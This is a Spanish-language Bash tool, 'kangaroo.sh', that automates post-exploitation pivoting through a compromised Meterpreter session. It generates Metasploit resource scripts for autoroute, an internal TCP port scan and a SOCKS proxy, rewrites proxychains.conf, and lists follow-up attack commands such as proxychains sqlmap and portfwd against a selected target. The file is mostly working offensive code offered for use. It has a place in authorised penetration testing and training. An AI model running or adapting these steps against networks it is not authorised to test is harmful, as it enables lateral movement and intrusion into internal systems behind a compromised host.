#!/usr/bin/env bash
# =============================================================================
#  kangaroo.sh — Pivoting estable + Scanner de red via Metasploit/Meterpreter
#  Autor   : Tony_ZeroD (ajromerofg-binary)
#  Versión : 2.0
#
#  DESCRIPCIÓN:
#    Fase 0 — RECON:   Autoroute temporal + TCP portscan de la subred objetivo.
#                      Identifica hosts vivos y puertos abiertos. El usuario
#                      elige el target (o pasa todos al .rc).
#    Fase 1 — PIVOT:   Autoroute permanente sobre la sesión comprometida.
#    Fase 2 — SOCKS:   Servidor SOCKS4a/5 en localhost para proxychains.
#    Fase 3 — OUTPUT:  .rc listo para msfconsole + proxychains.conf actualizado.
#
#  USO:
#    chmod +x kangaroo.sh
#    ./kangaroo.sh [opciones]
#
#  OPCIONES:
#    -s  SESSION_ID      ID sesión Meterpreter comprometida     (obligatorio)
#    -n  PIVOT_NETWORK   Red interna CIDR, ej: 192.168.112.0/24 (obligatorio)
#    -p  SOCKS_PORT      Puerto local SOCKS (default: 1080)
#    -v  SOCKS_VERSION   Versión SOCKS: 4a | 5 (default: 5)
#    -o  OUTPUT_RC       Fichero .rc de salida (default: kangaroo_<fecha>.rc)
#    -P  PROXYCHAINS_CFG Ruta proxychains.conf (default: /etc/proxychains4.conf)
#    -t  TARGET_PORTS    Puertos a escanear (default: 21,22,23,25,80,443,445,
#                                            3306,3389,5432,5900,6379,8080,8443)
#    -T  SCAN_THREADS    Hilos del portscan (default: 20, max: 50)
#    -S  SKIP_SCAN       Omitir fase de recon y pivotar directamente
#    -x  EXECUTE         Lanzar msfconsole con el .rc automáticamente
#    -h                  Mostrar esta ayuda
#
#  EJEMPLO:
#    ./kangaroo.sh -s 1 -n 192.168.112.0/24 -x
#    ./kangaroo.sh -s 1 -n 10.10.10.0/24 -t 22,80,443 -T 30 -x
#    ./kangaroo.sh -s 2 -n 172.16.0.0/24 -S -p 9050
# =============================================================================

set -euo pipefail

# ─── Colores ─────────────────────────────────────────────────────────────────
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

# ─── Valores por defecto ──────────────────────────────────────────────────────
SESSION_ID=""
PIVOT_NETWORK=""
SOCKS_PORT=1080
SOCKS_VERSION="5"
OUTPUT_RC=""
PROXYCHAINS_CFG="/etc/proxychains4.conf"
TARGET_PORTS="21,22,23,25,80,443,445,3306,3389,5432,5900,6379,8080,8443"
SCAN_THREADS=20
SKIP_SCAN=false
EXECUTE=false
TARGET_HOST=""          # Se rellena tras el recon (puede quedar vacío = todos)
SCAN_OUTPUT_RC=""       # .rc temporal para la fase de recon

# ─── Banner ───────────────────────────────────────────────────────────────────
banner() {
    echo -e "${CYAN}${BOLD}"
    echo "  ██████╗ ██╗██╗   ██╗ ██████╗ ████████╗"
    echo "  ██╔══██╗██║██║   ██║██╔═══██╗╚══██╔══╝"
    echo "  ██████╔╝██║██║   ██║██║   ██║   ██║   "
    echo "  ██╔═══╝ ██║╚██╗ ██╔╝██║   ██║   ██║   "
    echo "  ██║     ██║ ╚████╔╝ ╚██████╔╝   ██║   "
    echo "  ╚═╝     ╚═╝  ╚═══╝   ╚═════╝    ╚═╝   "
    echo ""
    echo "  Kangaroo v2.0 — Recon + Pivoting via Meterpreter"
    echo -e "  Tony_ZeroD // ajromerofg-binary${NC}"
    echo ""
}

# ─── Ayuda ────────────────────────────────────────────────────────────────────
usage() {
    echo -e "${BOLD}USO:${NC}"
    echo "  $0 -s SESSION_ID -n PIVOT_NETWORK [opciones]"
    echo ""
    echo -e "${BOLD}OBLIGATORIAS:${NC}"
    echo "  -s  SESSION_ID       ID de sesión Meterpreter activa"
    echo "  -n  PIVOT_NETWORK    Red interna a enrutar (CIDR)"
    echo ""
    echo -e "${BOLD}OPCIONALES:${NC}"
    echo "  -p  SOCKS_PORT       Puerto local SOCKS (default: 1080)"
    echo "  -v  SOCKS_VERSION    Versión SOCKS: 4a | 5 (default: 5)"
    echo "  -o  OUTPUT_RC        Fichero .rc de salida"
    echo "  -P  PROXYCHAINS_CFG  Ruta proxychains.conf"
    echo "  -t  TARGET_PORTS     Puertos a escanear (CSV)"
    echo "  -T  SCAN_THREADS     Hilos del portscan (default: 20)"
    echo "  -S                   Saltar fase de recon"
    echo "  -x                   Ejecutar msfconsole automáticamente"
    echo "  -h                   Mostrar esta ayuda"
    echo ""
    echo -e "${BOLD}EJEMPLOS:${NC}"
    echo "  $0 -s 1 -n 192.168.112.0/24 -x"
    echo "  $0 -s 1 -n 10.10.10.0/24 -t 22,80,443 -T 30 -x"
    echo "  $0 -s 2 -n 172.16.0.0/24 -S -p 9050"
    exit 0
}

# ─── Log helpers ──────────────────────────────────────────────────────────────
info()    { echo -e "${GREEN}[+]${NC} $*"; }
warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
error()   { echo -e "${RED}[-]${NC} $*"; }
section() { echo -e "\n${CYAN}${BOLD}[*] $*${NC}"; }
target()  { echo -e "${MAGENTA}[>]${NC} $*"; }

# ─── Parseo de argumentos ─────────────────────────────────────────────────────
parse_args() {
    while getopts "s:n:p:v:o:P:t:T:Sxh" opt; do
        case $opt in
            s) SESSION_ID="$OPTARG" ;;
            n) PIVOT_NETWORK="$OPTARG" ;;
            p) SOCKS_PORT="$OPTARG" ;;
            v) SOCKS_VERSION="$OPTARG" ;;
            o) OUTPUT_RC="$OPTARG" ;;
            P) PROXYCHAINS_CFG="$OPTARG" ;;
            t) TARGET_PORTS="$OPTARG" ;;
            T) SCAN_THREADS="$OPTARG" ;;
            S) SKIP_SCAN=true ;;
            x) EXECUTE=true ;;
            h) usage ;;
            *) error "Opción desconocida: -$OPTARG"; usage ;;
        esac
    done
}

# ─── Validaciones ─────────────────────────────────────────────────────────────
validate() {
    section "Validando parámetros"

    [[ -z "$SESSION_ID" ]] && { error "SESSION_ID es obligatorio (-s)"; exit 1; }
    # BUG E2 fix: SESSION_ID solo puede ser un entero positivo
    if ! [[ "$SESSION_ID" =~ ^[0-9]+$ ]]; then
        error "SESSION_ID debe ser un entero positivo. Recibido: '$SESSION_ID'"
        exit 1
    fi
    [[ -z "$PIVOT_NETWORK" ]] && { error "PIVOT_NETWORK es obligatorio (-n)"; exit 1; }

    # Validar CIDR — octetos 0-255, máscara 1-32
    local cidr_ok=false
    if echo "$PIVOT_NETWORK" | grep -qE '^([0-9]{1,3}\.){3}[0-9]{1,3}/([1-9]|[12][0-9]|3[0-2])$'; then
        local ip
        ip=$(echo "$PIVOT_NETWORK" | cut -d'/' -f1)
        local valid_octs=true
        IFS='.' read -r o1 o2 o3 o4 <<< "$ip"
        for oct in "$o1" "$o2" "$o3" "$o4"; do
            (( oct < 0 || oct > 255 )) && { valid_octs=false; break; }
        done
        $valid_octs && cidr_ok=true
    fi
    if ! $cidr_ok; then
        error "PIVOT_NETWORK no es un CIDR válido (octetos 0-255, máscara 1-32): $PIVOT_NETWORK"
        exit 1
    fi

    # Validar versión SOCKS
    if [[ "$SOCKS_VERSION" != "4a" && "$SOCKS_VERSION" != "5" ]]; then
        error "SOCKS_VERSION debe ser '4a' o '5'. Recibido: $SOCKS_VERSION"
        exit 1
    fi

    # Validar puerto SOCKS
    if ! [[ "$SOCKS_PORT" =~ ^[0-9]+$ ]] || (( SOCKS_PORT < 1 || SOCKS_PORT > 65535 )); then
        error "SOCKS_PORT inválido: $SOCKS_PORT"
        exit 1
    fi

    # Validar hilos
    if ! [[ "$SCAN_THREADS" =~ ^[0-9]+$ ]] || (( SCAN_THREADS < 1 || SCAN_THREADS > 50 )); then
        error "SCAN_THREADS debe estar entre 1 y 50. Recibido: $SCAN_THREADS"
        exit 1
    fi

    # msfconsole disponible si se va a ejecutar
    if $EXECUTE && ! command -v msfconsole &>/dev/null; then
        error "msfconsole no encontrado en PATH. Instala Metasploit Framework."
        exit 1
    fi

    # Nombre del .rc principal
    if [[ -z "$OUTPUT_RC" ]]; then
        OUTPUT_RC="kangaroo_$(date +%Y%m%d_%H%M%S).rc"
    fi

    # BUG E4 fix: validar que el directorio de OUTPUT_RC existe y es escribible
    local rc_dir
    rc_dir=$(dirname "$OUTPUT_RC")
    if [[ ! -d "$rc_dir" ]]; then
        error "El directorio para OUTPUT_RC no existe: '$rc_dir'"
        exit 1
    fi
    if [[ ! -w "$rc_dir" ]]; then
        error "Sin permisos de escritura en: '$rc_dir'"
        exit 1
    fi

    # Nombre del .rc temporal de recon
    SCAN_OUTPUT_RC="${OUTPUT_RC%.rc}_recon.rc"

    info "Session ID      : ${BOLD}$SESSION_ID${NC}"
    info "Red a pivotar   : ${BOLD}$PIVOT_NETWORK${NC}"
    info "Puerto SOCKS    : ${BOLD}$SOCKS_PORT${NC}"
    info "Versión SOCKS   : ${BOLD}SOCKS${SOCKS_VERSION}${NC}"
    info "Puertos scan    : ${BOLD}$TARGET_PORTS${NC}"
    info "Hilos scan      : ${BOLD}$SCAN_THREADS${NC}"
    info "Resource script : ${BOLD}$OUTPUT_RC${NC}"
    info "proxychains cfg : ${BOLD}$PROXYCHAINS_CFG${NC}"
    if $SKIP_SCAN; then
        warn "Fase recon      : OMITIDA (-S)"
    else
        info "Fase recon      : ${BOLD}ACTIVA${NC}"
    fi
    if $EXECUTE; then
        info "Modo ejecución  : ${BOLD}AUTO (lanzará msfconsole)${NC}"
    else
        info "Modo ejecución  : ${BOLD}SOLO GENERACIÓN de .rc${NC}"
    fi
}

# ─── FASE 0: RECON ────────────────────────────────────────────────────────────
# Genera un .rc temporal que:
#   1. Añade Autoroute temporal
#   2. Lanza TCP portscan contra la subred
#   3. Vuelca resultados a fichero de log
#   4. Limpia la ruta temporal
# Luego parsea el log, presenta hosts y deja elegir target.
# ─────────────────────────────────────────────────────────────────────────────
run_recon() {
    $SKIP_SCAN && return 0

    section "FASE 0 — Reconocimiento de red interna"

    if ! command -v msfconsole &>/dev/null; then
        warn "msfconsole no disponible — omitiendo recon automático."
        warn "Escanea manualmente con: nmap -sT -Pn -p $TARGET_PORTS $PIVOT_NETWORK"
        SKIP_SCAN=true
        return 0
    fi

    local SCAN_LOG
    SCAN_LOG="${OUTPUT_RC%.rc}_recon.log"

    info "Generando .rc de recon temporal: $SCAN_OUTPUT_RC"

    cat > "$SCAN_OUTPUT_RC" << EOF
# ── Kangaroo v2.0 — Recon RC (temporal) ──────────────────────────────────────

# 1. Autoroute temporal para poder alcanzar la red interna
use post/multi/manage/autoroute
set SESSION $SESSION_ID
set SUBNET $PIVOT_NETWORK
set CMD add
run

# 2. TCP Portscan sobre toda la subred
use auxiliary/scanner/portscan/tcp
set RHOSTS $PIVOT_NETWORK
set PORTS $TARGET_PORTS
set THREADS $SCAN_THREADS
set TIMEOUT 500
run

# 3. Limpiar ruta temporal (se añadirá de forma permanente en el .rc principal)
use post/multi/manage/autoroute
set SESSION $SESSION_ID
set SUBNET $PIVOT_NETWORK
set CMD delete
run

exit
EOF

    info "Lanzando recon... (esto puede tardar según el tamaño de la subred)"
    echo ""
    warn "Pulsa Ctrl+C para cancelar el recon y continuar sin target definido."
    echo ""

    # Ejecutar msfconsole con el .rc de recon, capturando la salida
    msfconsole -q -r "$SCAN_OUTPUT_RC" 2>&1 | tee "$SCAN_LOG" || true

    echo ""
    section "Parseando resultados del recon"

    # Parsear hosts con puertos abiertos del log de msfconsole
    # El scanner tcp de msf emite líneas como:
    #   [+] 192.168.112.4:80 - TCP OPEN
    local HOSTS_FILE
    HOSTS_FILE="${OUTPUT_RC%.rc}_hosts.txt"

    grep -E "TCP OPEN" "$SCAN_LOG" 2>/dev/null \
        | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+:[0-9]+' \
        | sort -t. -k1,1n -k2,2n -k3,3n -k4,4n \
        > "$HOSTS_FILE" || true

    if [[ ! -s "$HOSTS_FILE" ]]; then
        warn "No se encontraron hosts con puertos abiertos en $PIVOT_NETWORK."
        warn "Posibles causas: firewall, tiempos de espera, permisos de sesión."
        warn "Continuando sin target definido — edita el .rc manualmente."
        rm -f "$SCAN_OUTPUT_RC" "$HOSTS_FILE"
        return 0
    fi

    # Mostrar tabla de resultados
    echo ""
    echo -e "${BOLD}  Hosts descubiertos en $PIVOT_NETWORK:${NC}"
    echo "  ─────────────────────────────────────────"

    # Agrupar por IP
    local -A HOST_PORTS
    while IFS=: read -r ip port; do
        if [[ -v HOST_PORTS[$ip] ]]; then
            HOST_PORTS[$ip]="${HOST_PORTS[$ip]}, $port"
        else
            HOST_PORTS[$ip]="$port"
        fi
    done < "$HOSTS_FILE"

    local idx=1
    local -a HOST_LIST=()
    for ip in $(echo "${!HOST_PORTS[@]}" | tr ' ' '\n' | sort -t. -k1,1n -k2,2n -k3,3n -k4,4n); do
        target "[$idx] $ip  →  puertos: ${HOST_PORTS[$ip]}"
        HOST_LIST+=("$ip")
        (( idx++ ))
    done
    echo "  ─────────────────────────────────────────"
    echo ""

    # Selección interactiva del target
    local total=${#HOST_LIST[@]}
    echo -e "${BOLD}  Selecciona el target para el pivoting:${NC}"
    echo "  [0] Todos los hosts (no fijar TARGET_HOST en el .rc)"
    echo ""

    local choice
    while true; do
        read -r -p "  Opción [0-$total]: " choice
        if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 0 && choice <= total )); then
            break
        fi
        warn "Opción inválida. Introduce un número entre 0 y $total."
    done

    if (( choice == 0 )); then
        info "Sin target fijo — el .rc incluirá comentario con todos los hosts."
        TARGET_HOST=""
    else
        TARGET_HOST="${HOST_LIST[$((choice-1))]}"
        info "Target seleccionado: ${BOLD}$TARGET_HOST${NC}"
    fi

    # Limpiar temporales
    rm -f "$SCAN_OUTPUT_RC" "$HOSTS_FILE"
    info "Log de recon guardado en: $SCAN_LOG"
}

# ─── FASE 1+2+3: Generación del .rc principal ────────────────────────────────
generate_rc() {
    section "FASE 1-3 — Generando resource script: $OUTPUT_RC"

    # Bloque de target en el .rc
    local target_block=""
    if [[ -n "$TARGET_HOST" ]]; then
        target_block="
# ── TARGET identificado en fase de recon ─────────────────────────────────────
# Host  : $TARGET_HOST
# Puertos abiertos detectados durante el recon.
# Ajusta los comandos de abajo según el servicio que vayas a atacar.
# Ejemplo de portfwd para acceso directo sin proxychains:
#   sessions -i $SESSION_ID
#   portfwd add -l 8080 -p 80 -r $TARGET_HOST
"
    else
        target_block="
# ── Hosts descubiertos en el recon (todos seleccionados) ─────────────────────
# Revisa el log de recon para ver los hosts y puertos disponibles.
# Usa proxychains para alcanzarlos tras levantar el pivote.
"
    fi

    cat > "$OUTPUT_RC" << EOF
# =============================================================================
#  Kangaroo v2.0 — Resource Script de Pivoting
#  Generado : $(date '+%Y-%m-%d %H:%M:%S')
#  Session  : $SESSION_ID
#  Red      : $PIVOT_NETWORK
#  SOCKS    : ${SOCKS_VERSION} en puerto $SOCKS_PORT
#  Target   : ${TARGET_HOST:-"(no fijado — usa proxychains contra cualquier host)"}
# =============================================================================
$target_block
# ── 1. Autoroute permanente a través de la sesión comprometida ───────────────
use post/multi/manage/autoroute
set SESSION $SESSION_ID
set SUBNET $PIVOT_NETWORK
set CMD add
run

# ── 2. Verificar rutas activas ───────────────────────────────────────────────
use post/multi/manage/autoroute
set SESSION $SESSION_ID
set CMD print
run

# ── 3. Levantar servidor SOCKS${SOCKS_VERSION} en localhost:${SOCKS_PORT} ───────────────────
use auxiliary/server/socks_proxy
set SRVPORT $SOCKS_PORT
set VERSION $SOCKS_VERSION
set SRVHOST 127.0.0.1
run -j

# ── 4. Verificar jobs activos ────────────────────────────────────────────────
jobs -l

# ── 5. Instrucciones de uso ───────────────────────────────────────────────────
echo ""
echo "[+] =============================================="
echo "[+]  Kangaroo — Pivoting activo"
echo "[+] =============================================="
echo "[+]  Red interna : $PIVOT_NETWORK"
echo "[+]  SOCKS${SOCKS_VERSION}     : 127.0.0.1:${SOCKS_PORT}"
$([ -n "$TARGET_HOST" ] && echo "echo \"[+]  Target      : $TARGET_HOST\"" || echo "echo \"[+]  Target      : usa proxychains contra cualquier host\"")
echo "[+] =============================================="
echo ""
echo "  proxychains nmap -sT -Pn -p $TARGET_PORTS ${TARGET_HOST:-<TARGET_IP>}"
echo "  proxychains curl -v http://${TARGET_HOST:-<TARGET_IP>}"
echo "  proxychains ssh user@${TARGET_HOST:-<TARGET_IP>}"
echo ""
EOF

    info "Resource script generado: ${BOLD}$OUTPUT_RC${NC}"
}

# ─── Actualizar proxychains.conf ──────────────────────────────────────────────
update_proxychains() {
    section "Actualizando $PROXYCHAINS_CFG"

    if [[ ! -f "$PROXYCHAINS_CFG" ]]; then
        warn "$PROXYCHAINS_CFG no existe."
        if [[ $EUID -ne 0 ]]; then
            warn "No eres root. Añade manualmente en [ProxyList]:"
            echo "  socks${SOCKS_VERSION} 127.0.0.1 ${SOCKS_PORT}"
            return
        fi
        cat > "$PROXYCHAINS_CFG" << PCEOF
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks${SOCKS_VERSION} 127.0.0.1 ${SOCKS_PORT}
PCEOF
        info "Fichero $PROXYCHAINS_CFG creado."
        return
    fi

    if [[ $EUID -ne 0 ]]; then
        warn "No eres root. Edita $PROXYCHAINS_CFG manualmente:"
        echo "  socks${SOCKS_VERSION} 127.0.0.1 ${SOCKS_PORT}"
        return
    fi

    local BACKUP
    BACKUP="${PROXYCHAINS_CFG}.bak.$(date +%Y%m%d_%H%M%S)"
    cp "$PROXYCHAINS_CFG" "$BACKUP"
    info "Backup creado en: $BACKUP"

    python3 - "$PROXYCHAINS_CFG" "$SOCKS_VERSION" "$SOCKS_PORT" << 'PYEOF'
import sys, re
cfg_path, socks_ver, socks_port = sys.argv[1], sys.argv[2], sys.argv[3]
with open(cfg_path, 'r') as f:
    content = f.read()
lines = content.splitlines()
in_proxylist = False
clean_lines = []
for line in lines:
    if line.strip().lower() == '[proxylist]':
        in_proxylist = True
        clean_lines.append(line)
        continue
    if in_proxylist and re.match(r'^\s*socks[45a]+\s+', line, re.I):
        continue
    clean_lines.append(line)
new_content = '\n'.join(clean_lines)
if '[ProxyList]' not in new_content:
    new_content += '\n\n[ProxyList]'
new_content = new_content.rstrip() + f'\nsocks{socks_ver} 127.0.0.1 {socks_port}\n'
with open(cfg_path, 'w') as f:
    f.write(new_content)
print(f"[+] socks{socks_ver} 127.0.0.1 {socks_port} -> {cfg_path}")
PYEOF
    local py_exit=$?
    if (( py_exit != 0 )); then
        error "Falló la actualización de $PROXYCHAINS_CFG."
        warn "Añade manualmente: socks${SOCKS_VERSION} 127.0.0.1 ${SOCKS_PORT}"
    fi
}

# ─── Resumen final ────────────────────────────────────────────────────────────
print_summary() {
    section "Resumen y próximos pasos"

    local tgt="${TARGET_HOST:-<TARGET_IP>}"

    echo -e "${BOLD}1. Lanzar el pivote:${NC}"
    echo "   msfconsole -r $OUTPUT_RC"
    echo ""
    echo -e "${BOLD}2. Verificar SOCKS activo:${NC}"
    echo "   msf > jobs -l"
    echo ""
    echo -e "${BOLD}3. Atacar con proxychains:${NC}"
    echo "   proxychains nmap -sT -Pn -p $TARGET_PORTS $tgt"
    echo "   proxychains curl -v http://$tgt"
    echo "   proxychains ssh user@$tgt"
    echo "   proxychains sqlmap -u \"http://$tgt/login\""
    echo ""
    echo -e "${BOLD}4. Portfwd directo (sin proxychains):${NC}"
    echo "   msf > sessions -i $SESSION_ID"
    echo "   meterpreter > portfwd add -l 8080 -p 80 -r $tgt"
    echo ""
    echo -e "${BOLD}5. Limpiar al terminar:${NC}"
    echo "   msf > route flush"
    echo "   msf > jobs -k <JOB_ID>"
    echo ""
    echo -e "${GREEN}${BOLD}[OK] kangaroo.sh completado.${NC}"
}

# ─── Ejecutar msfconsole con el .rc principal ─────────────────────────────────
run_msf() {
    if $EXECUTE; then
        section "Lanzando msfconsole con $OUTPUT_RC"
        warn "Se abrirá msfconsole. Cierra con 'exit' cuando termines."
        sleep 1
        msfconsole -r "$OUTPUT_RC"
    fi
}

# ─── Main ─────────────────────────────────────────────────────────────────────
main() {
    banner
    parse_args "$@"
    validate
    run_recon       # Fase 0 — recon + selección de target
    generate_rc     # Fase 1+2+3 — genera .rc con autoroute + SOCKS
    update_proxychains
    print_summary
    run_msf
}

main "$@"
